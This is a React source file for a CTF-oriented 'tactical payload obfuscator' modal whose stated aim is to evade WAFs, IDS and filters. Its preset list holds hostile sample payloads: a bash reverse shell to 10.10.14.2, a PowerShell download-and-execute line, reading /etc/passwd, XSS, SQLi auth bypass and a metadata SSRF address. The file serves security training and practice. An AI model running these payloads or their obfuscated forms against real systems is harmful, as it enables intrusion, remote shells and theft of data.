import React, { useState, useEffect, useMemo, useRef } from 'react';
import { 
  X, 
  Copy, 
  Check, 
  Terminal, 
  Sparkles, 
  Zap, 
  ShieldAlert, 
  Search, 
  FileCode, 
  ExternalLink,
  RotateCcw,
  Sliders,
  Globe,
  Radio,
  FileText
} from 'lucide-react';
import { useCtfStore } from '../../store/useCtfStore';
import { 
  generateAllObfuscations, 
  ObfuscatedItem, 
  toBase64, 
  fromBase64 
} from '../../utils/payloadObfuscatorUtils';
import { playCyberSound, safeCopyToClipboard } from '../../utils/helpers';

import { useModalA11y } from '../../hooks/useModalA11y';

const QUICK_PAYLOAD_PRESETS = [
  { label: 'Linux passwd', payload: 'cat /etc/passwd' },
  { label: 'Bash RevShell', payload: 'bash -i >& /dev/tcp/10.10.14.2/4444 0>&1' },
  { label: 'PowerShell Download', payload: "IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.2/run.ps1')" },
  { label: 'XSS Vector', payload: '<script>alert(document.domain)</script>' },
  { label: 'SQLi Auth Bypass', payload: "admin' OR 1=1--" },
  { label: 'Internal SSRF IP', payload: '169.254.169.254' },
];

export const CyberForgeModal: React.FC = () => {
  const { 
    cyberForgeModalOpen, 
    cyberForgeInitialPayload, 
    setCyberForgeModalOpen, 
    soundEnabled,
    activeTargetId,
    machines,
    updateMachine
  } = useCtfStore();

  const [inputPayload, setInputPayload] = useState('cat /etc/passwd');
  const [activeCategory, setActiveCategory] = useState<string>('all');
  const [searchFilter, setSearchFilter] = useState('');
  const [copiedId, setCopiedId] = useState<string | null>(null);
  const [syncFeedback, setSyncFeedback] = useState<string | null>(null);
  const inputRef = useRef<HTMLTextAreaElement>(null);
  const modalContainerRef = useRef<HTMLDivElement>(null);

  useModalA11y({
    isOpen: cyberForgeModalOpen,
    onClose: () => setCyberForgeModalOpen(false),
    modalRef: modalContainerRef,
  });

  const activeTarget = useMemo(() => {
    return machines.find((m) => m.id === activeTargetId) || null;
  }, [machines, activeTargetId]);

  // Sync initial payload if provided
  useEffect(() => {
    if (cyberForgeModalOpen && cyberForgeInitialPayload) {
      setInputPayload(cyberForgeInitialPayload);
    }
  }, [cyberForgeModalOpen, cyberForgeInitialPayload]);

  const allObfuscations = useMemo(() => {
    return generateAllObfuscations(inputPayload);
  }, [inputPayload]);

  const filteredItems = useMemo(() => {
    return allObfuscations.filter((item) => {
      const matchesCategory = activeCategory === 'all' || item.category === activeCategory;
      const matchesSearch = !searchFilter || 
        item.name.toLowerCase().includes(searchFilter.toLowerCase()) || 
        item.output.toLowerCase().includes(searchFilter.toLowerCase()) ||
        item.description.toLowerCase().includes(searchFilter.toLowerCase());
      return matchesCategory && matchesSearch;
    });
  }, [allObfuscations, activeCategory, searchFilter]);

  if (!cyberForgeModalOpen) return null;

  const handleCopy = async (text: string, id: string) => {
    await safeCopyToClipboard(text);
    setCopiedId(id);
    if (soundEnabled) playCyberSound('copy');
    setTimeout(() => setCopiedId(null), 2000);
  };

  const handleSendToTargetNotes = (item: ObfuscatedItem) => {
    if (!activeTarget) return;
    const snippet = `\n\n### ⚡ CyberForge Payload: ${item.name}\n\`\`\`text\n${item.output}\n\`\`\`\n`;
    const updated = (activeTarget.quickNotes || '') + snippet;
    updateMachine(activeTarget.id, { quickNotes: updated });
    setSyncFeedback(item.id);
    if (soundEnabled) playCyberSound('flag');
    setTimeout(() => setSyncFeedback(null), 2500);
  };

  return (
    <div 
      className="fixed inset-0 z-[120] flex items-center justify-center p-2 sm:p-4 bg-black/85 backdrop-blur-md animate-fade-in font-mono"
      onClick={() => setCyberForgeModalOpen(false)}
      role="dialog"
      aria-modal="true"
      aria-labelledby="cyberforge-modal-title"
    >
      <div 
        ref={modalContainerRef}
        className="w-full max-w-5xl h-full sm:h-auto sm:max-h-[92vh] flex flex-col rounded-xl border border-cyber-cyan/30 bg-cyber-card shadow-[0_0_50px_rgba(6,182,212,0.15)] overflow-hidden"
        onClick={(e) => e.stopPropagation()}
      >
        {/* Header */}
        <div className="flex-shrink-0 flex items-center justify-between border-b border-cyber-border p-4 bg-cyber-bg/95">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-cyber-cyan/10 border border-cyber-cyan/30 text-cyber-cyan shadow-[0_0_15px_rgba(6,182,212,0.3)]">
              <Zap className="w-5 h-5 animate-pulse" />
            </div>
            <div>
              <div className="flex items-center gap-2">
                <h3 id="cyberforge-modal-title" className="text-base font-bold text-white tracking-wide flex items-center gap-2">
                  CYBERFORGE <span className="text-cyber-cyan">//</span> TACTICAL PAYLOAD OBFUSCATOR
                </h3>
                <span className="px-2 py-0.5 rounded text-[10px] font-bold bg-cyan-500/10 text-cyber-cyan border border-cyan-500/30">
                  REAL-TIME CLIENT-SIDE
                </span>
              </div>
              <p className="text-xs text-cyber-muted">
                Evade WAFs, IDS, and character filters with multi-tier shell, web, and IP transformations.
              </p>
            </div>
          </div>

          <button
            onClick={() => setCyberForgeModalOpen(false)}
            aria-label="Close modal"
            className="p-1.5 rounded bg-cyber-bg text-cyber-muted hover:text-white border border-cyber-border hover:border-cyber-cyan/50 transition-all"
          >
            <X className="w-4 h-4" />
          </button>
        </div>

        {/* Preset Chips Bar */}
        <div className="bg-[#0b101d] px-4 py-2 border-b border-cyber-border/80 flex items-center gap-2 overflow-x-auto text-xs flex-shrink-0">
          <span className="text-[11px] text-cyber-muted uppercase font-bold tracking-wider flex items-center gap-1 flex-shrink-0">
            <Sparkles className="w-3 h-3 text-cyber-cyan" /> Quick Presets:
          </span>
          {QUICK_PAYLOAD_PRESETS.map((p, idx) => (
            <button
              key={idx}
              onClick={() => {
                setInputPayload(p.payload);
                if (soundEnabled) playCyberSound('click');
              }}
              className="px-2.5 py-1 rounded bg-cyber-card hover:bg-cyber-cyan/15 text-slate-300 hover:text-cyber-cyan border border-cyber-border hover:border-cyber-cyan/40 transition-all whitespace-nowrap text-[11px] font-semibold"
            >
              {p.label}
            </button>
          ))}
          <button
            onClick={() => {
              setInputPayload('');
              if (soundEnabled) playCyberSound('click');
            }}
            className="ml-auto px-2 py-1 rounded text-cyber-muted hover:text-rose-400 text-[11px] flex items-center gap-1 transition-colors flex-shrink-0"
            title="Clear input"
          >
            <RotateCcw className="w-3 h-3" /> Clear
          </button>
        </div>

        {/* Input Textarea Section */}
        <div className="p-4 border-b border-cyber-border bg-[#080d19] flex-shrink-0">
          <div className="flex items-center justify-between mb-1.5">
            <label htmlFor="raw-payload-input" className="text-xs font-bold text-cyber-cyan uppercase tracking-wider flex items-center gap-1.5">
              <Terminal className="w-3.5 h-3.5" /> RAW PAYLOAD / TARGET STRING:
            </label>
            <span className="text-[10px] text-cyber-muted font-mono">
              {inputPayload.length} chars &middot; {new TextEncoder().encode(inputPayload).length} bytes
            </span>
          </div>
          <textarea
            id="raw-payload-input"
            ref={inputRef}
            rows={3}
            value={inputPayload}
            onChange={(e) => setInputPayload(e.target.value)}
            placeholder="Type or paste payload string here (e.g. bash reverse shell, SQL injection, IP, or command)..."
            className="w-full bg-[#050811] text-emerald-400 font-mono text-xs sm:text-sm p-3 rounded-lg border border-cyber-border focus:border-cyber-cyan focus:ring-1 focus:ring-cyber-cyan outline-none resize-none transition-all placeholder:text-slate-600"
          />
        </div>

        {/* Filter & Search Bar */}
        <div className="bg-[#0b101d] px-4 py-2.5 border-b border-cyber-border flex flex-wrap items-center justify-between gap-3 flex-shrink-0">
          {/* Category Tabs */}
          <div className="flex items-center gap-1.5 overflow-x-auto text-xs">
            {[
              { id: 'all', label: 'All Modes' },
              { id: 'powershell', label: 'PowerShell' },
              { id: 'linux', label: 'Linux & Bash' },
              { id: 'url', label: 'URL & Web' },
              { id: 'web', label: 'SQLi & HTML' },
              { id: 'encoding', label: 'Encodings' },
              { id: 'ip', label: 'IP Bypasses' },
            ].map((tab) => (
              <button
                key={tab.id}
                onClick={() => {
                  setActiveCategory(tab.id);
                  if (soundEnabled) playCyberSound('click');
                }}
                className={`px-2.5 py-1 rounded text-xs font-bold transition-all ${
                  activeCategory === tab.id
                    ? 'bg-cyber-cyan text-black shadow-[0_0_10px_rgba(6,182,212,0.4)]'
                    : 'text-cyber-muted hover:text-white hover:bg-cyber-card/60'
                }`}
              >
                {tab.label}
              </button>
            ))}
          </div>

          {/* Quick Search */}
          <div className="relative min-w-[200px] flex-1 sm:flex-initial">
            <Search className="w-3.5 h-3.5 text-cyber-muted absolute left-2.5 top-1/2 -translate-y-1/2" />
            <input
              type="text"
              value={searchFilter}
              onChange={(e) => setSearchFilter(e.target.value)}
              placeholder="Search output / format..."
              className="w-full bg-[#050811] text-xs text-white pl-8 pr-3 py-1 rounded border border-cyber-border focus:border-cyber-cyan outline-none placeholder:text-slate-600"
            />
          </div>
        </div>

        {/* Obfuscated Payload Cards Stream */}
        <div className="flex-1 overflow-y-auto p-4 space-y-3 bg-[#070b16]">
          {filteredItems.length === 0 ? (
            <div className="py-16 text-center text-cyber-muted flex flex-col items-center justify-center gap-2">
              <Sliders className="w-8 h-8 text-slate-600" />
              <p className="text-xs">No transformations match the current filter.</p>
            </div>
          ) : (
            filteredItems.map((item) => {
              const isCopied = copiedId === item.id;
              const isSynced = syncFeedback === item.id;

              return (
                <div
                  key={item.id}
                  className="rounded-lg border border-cyber-border bg-cyber-card/90 hover:border-cyber-cyan/40 p-3.5 transition-all shadow-sm group"
                >
                  <div className="flex items-center justify-between gap-2 mb-1.5">
                    <div className="flex items-center gap-2 flex-wrap">
                      <span className="text-xs font-bold text-white tracking-wide">
                        {item.name}
                      </span>
                      <span className="px-1.5 py-0.5 rounded text-[9px] font-bold uppercase tracking-wider bg-slate-800 text-cyber-cyan border border-cyber-cyan/20">
                        {item.category}
                      </span>
                    </div>

                    <div className="flex items-center gap-1.5">
                      {activeTarget && (
                        <button
                          onClick={() => handleSendToTargetNotes(item)}
                          className="px-2 py-1 rounded text-[10px] font-bold bg-purple-500/10 hover:bg-purple-500/20 text-purple-300 border border-purple-500/30 flex items-center gap-1 transition-all"
                          title={`Send payload to ${activeTarget.name} Field Notes`}
                        >
                          {isSynced ? <Check className="w-3 h-3 text-emerald-400" /> : <FileText className="w-3 h-3" />}
                          {isSynced ? 'Attached!' : 'To Notes'}
                        </button>
                      )}

                      <button
                        onClick={() => handleCopy(item.output, item.id)}
                        className={`px-2.5 py-1 rounded text-xs font-bold transition-all flex items-center gap-1.5 border ${
                          isCopied
                            ? 'bg-emerald-500/20 text-emerald-400 border-emerald-500/40 shadow-[0_0_10px_rgba(16,185,129,0.3)]'
                            : 'bg-cyber-cyan/10 hover:bg-cyber-cyan text-cyber-cyan hover:text-black border-cyber-cyan/30'
                        }`}
                      >
                        {isCopied ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                        {isCopied ? 'Copied' : 'Copy'}
                      </button>
                    </div>
                  </div>

                  <p className="text-[11px] text-cyber-muted mb-2">
                    {item.description}
                  </p>

                  <div className="relative">
                    <pre className="p-2.5 rounded bg-[#03060d] border border-cyber-border text-xs text-emerald-400 font-mono overflow-x-auto whitespace-pre-wrap break-all select-all selection:bg-cyan-500 selection:text-black">
                      {item.output}
                    </pre>
                  </div>
                </div>
              );
            })
          )}
        </div>

        {/* Footer */}
        <div className="p-3 bg-[#080d19] border-t border-cyber-border flex items-center justify-between text-xs text-cyber-muted flex-shrink-0">
          <span className="flex items-center gap-1.5 text-[11px]">
            <Radio className="w-3 h-3 text-cyber-cyan animate-pulse" />
            Active Target: <strong className="text-white">{activeTarget ? activeTarget.name : 'None (Global)'}</strong>
          </span>
          <button
            onClick={() => setCyberForgeModalOpen(false)}
            className="px-4 py-1 rounded bg-cyber-card hover:bg-slate-800 text-white border border-cyber-border text-xs font-bold transition-all"
          >
            Close Deck
          </button>
        </div>
      </div>
    </div>
  );
};
